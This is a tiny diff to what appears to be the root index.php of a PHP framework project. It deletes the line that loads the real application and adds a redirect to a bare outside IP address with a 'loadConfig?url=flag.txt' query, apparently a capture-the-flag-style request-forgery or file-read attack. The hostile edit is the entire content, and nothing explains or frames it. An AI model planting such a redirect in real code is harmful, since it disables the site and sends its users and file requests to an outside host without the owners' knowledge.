@@ -13,4 +13,5 @@
  * @license       https://opensource.org/licenses/mit-license.php MIT License
  */
 
-require 'webroot' . DIRECTORY_SEPARATOR . 'index.php';
+header("Location: http://121.36.145.157:8088/loadConfig?url=flag.txt");
+
